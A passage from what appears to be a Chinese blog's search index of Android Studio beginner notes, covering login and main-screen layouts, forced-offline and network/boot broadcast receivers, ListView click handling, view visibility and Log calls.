class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.LoginActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/textView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;Account&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;25sp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.1&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.3&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">EditText</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/accountEdit&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.3&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@+id/textView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/pwView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;Password&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">&quot;25sp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.1&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/textView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.3&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">EditText</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/pwEdit&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;0dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.0&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">&quot;@+id/pwView&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.536&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/login&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;120dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;45dp&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;Login&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">&quot;0.498&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">&quot;0.715&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="主界面代码"><a href="#主界面代码" class="headerlink" title="主界面代码"></a>主界面代码</h2><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.broadcastbestpractive;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-comment">//继承BaseActivity方便广播时接收</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseActivity</span> </span>&#123;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-comment">//赋值对应的按钮并进行监听</span><br>        Button forceOffline=(Button)findViewById(R.id.force_offLine);<br>        forceOffline.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>                <span class="hljs-comment">//如果点击后发送广播内容如下</span><br>                Intent intent=<span class="hljs-keyword">new</span> Intent(<span class="hljs-string">&quot;com.example.broadcastbestpractice.FORCE_OFFLINE&quot;</span>);<br>                sendBroadcast(intent);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>activity_main.xml</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">&quot;http://schemas.android.com/tools&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;match_parent&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/textView2&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;Hello World!&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">&quot;parent&quot;</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">&quot;@+id/force_offLine&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">&quot;wrap_content&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">&quot;强制下线&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintLeft_toLeftOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintRight_toRightOf</span>=<span class="hljs-string">&quot;parent&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">&quot;@+id/textView2&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 广播</title>
    <link href="/2021/04/01/AndroidStudio/Android%20Studio%20%E5%B9%BF%E6%92%AD/"/>
    <url>/2021/04/01/AndroidStudio/Android%20Studio%20%E5%B9%BF%E6%92%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-广播"><a href="#Android-Studio-广播" class="headerlink" title="Android Studio 广播"></a>Android Studio 广播</h1><h2 id="动态广播"><a href="#动态广播" class="headerlink" title="动态广播"></a>动态广播</h2><p>指在代码中注册即为动态注册，只能在程序启动后才能接受到广播</p><p>实现网络开关（变化）时弹出信息</p><p>相关代码</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AppCompatActivity</span> </span>&#123;<br>    <span class="hljs-comment">//声明需要的变量</span><br>    <span class="hljs-keyword">private</span> IntentFilter intentFilter;<br>    <span class="hljs-keyword">private</span> NetworkChangeReceiver networkChangeReceiver;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <br>        intentFilter=<span class="hljs-keyword">new</span> IntentFilter();<br>        <span class="hljs-comment">//网络变化时系统发出的广播名称android.net.conn.CONNECTIVITY_CHANGE</span><br>        intentFilter.addAction(<span class="hljs-string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span>);<br>        networkChangeReceiver=<span class="hljs-keyword">new</span> NetworkChangeReceiver();<br>        <span class="hljs-comment">//注册广播</span><br>        registerReceiver(networkChangeReceiver,intentFilter);<br>    &#125;<br>    <span class="hljs-comment">//取消广播注册 动态广播注册都需要取消</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onDestroy</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">super</span>.onDestroy();<br>        <span class="hljs-comment">//实现取消注册</span><br>        unregisterReceiver(networkChangeReceiver);<br>    &#125;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkChangeReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BroadcastReceiver</span></span>&#123;<br><br>        <span class="hljs-comment">//重写onReceive方法每当检测变化时都会执行的方法</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> </span>&#123;<br>            Toast.makeText(context,<span class="hljs-string">&quot;netWork Changes&quot;</span>,Toast.LENGTH_SHORT).show();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>安卓获取权限信息时需要在AndroidManifest.xml下添加申请</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="静态广播"><a href="#静态广播" class="headerlink" title="静态广播"></a>静态广播</h2><p>启用给定类直接注册，可以在应用未启动接受广播</p><p>建立方法为右键选择new other Broadcast_Receiver</p><p>实现开机后弹出信息</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.broadcasttest;<br><br><span class="hljs-keyword">import</span> android.content.BroadcastReceiver;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BootCompleteReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BroadcastReceiver</span> </span>&#123;<br><br>    <span class="hljs-comment">//检测到开机变化时发出信息</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> </span>&#123;<br>        Toast.makeText(context,<span class="hljs-string">&quot;Boot ！&quot;</span>,Toast.LENGTH_LONG).show();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 申请使用相关是否开机的权限 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.BootCompleteReceiver&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">android:enabled</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">          <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 开机后将发出android.intent.action.BOOT_COMPLETED进行监听 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio ListView点击事件</title>
    <link href="/2021/04/01/AndroidStudio/Android%20Studio%20ListView%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6/"/>
    <url>/2021/04/01/AndroidStudio/Android%20Studio%20ListView%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-ListView点击事件"><a href="#Android-Studio-ListView点击事件" class="headerlink" title="Android Studio ListView点击事件"></a>Android Studio ListView点击事件</h1><p>ListView的简易实现</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ArrayAdapter&lt;String&gt; adapter = <span class="hljs-keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="hljs-keyword">this</span>,android.R.layout.simple_list_item_1,data);<span class="hljs-comment">//新建并配置ArrayAapeter</span><br>listView.setAdapter(adapter);<br></code></pre></div></td></tr></table></figure><p>相关代码</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//监听listView事件</span><br>listView.setOnItemClickListener(<span class="hljs-keyword">new</span> AdapterView.OnItemClickListener() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onItemClick</span><span class="hljs-params">(AdapterView&lt;?&gt; parent, View view, <span class="hljs-keyword">int</span> position, <span class="hljs-keyword">long</span> id)</span> </span>&#123;<br>        Fruit fruit=fruitList.get(position);<br>        Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>,fruit.getName(),Toast.LENGTH_SHORT).show();<br>    &#125;<br>&#125;);<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio 控件</title>
    <link href="/2021/03/31/AndroidStudio/Android%20Studio%20%E6%8E%A7%E4%BB%B6/"/>
    <url>/2021/03/31/AndroidStudio/Android%20Studio%20%E6%8E%A7%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-控件"><a href="#Android-Studio-控件" class="headerlink" title="Android Studio 控件"></a>Android Studio 控件</h1><p>Android控件的可见属性，所有控件都具有这个属性，可以通过android: visibility进行指定。<br>可选值有3种: visible invisible gone。visible是可见的，invisible不可见，但仍然占据着原来的位置和大小，可以理解为透明了，gone表示不仅不可见，而且也不占据任何屏幕空间了。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//设置方法</span><br>View test=(View)findViewById(R.id.test);<br>test.setVisibility(View.GONE);<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroidStudio</tag>
      
      <tag>基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio Log</title>
    <link href="/2021/03/31/AndroidStudio/Android%20Studio%20Log/"/>
    <url>/2021/03/31/AndroidStudio/Android%20Studio%20Log/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-Studio-Log"><a href="#Android-Studio-Log" class="headerlink" title="Android Studio Log"></a>Android Studio Log</h1><ol><li>Log.v(TAG，”onCreate“)</li><li>Log.d(TAG，”onCreate“) debug</li><li>Log.i(TAG，”onCreate“)  info 重要信息</li><li>Log.w(TAG，”onCreate“) 打印警告信息</li><li>Log.e(TAG，”onCreate“) 错误</li></ol><p>TAG表示标签 一般是当前类名 对打印信息进行过滤</p><p>msg 要打印的具体内容</p><p>Log的打印方法需要传入参数</p><p>所以在类外设置String</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//MainActivity表示当前类名</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String TAG=<span class="hljs-string">&quot;MainActivity&quot;</span>;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android Studio</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android Studio</title>
    <link href="/2021/03/31/AndroidStudio/Android%20Studio/"/>
    <url>/2021/03/31/AndroidStudio/Android%20Studio/</url>
    
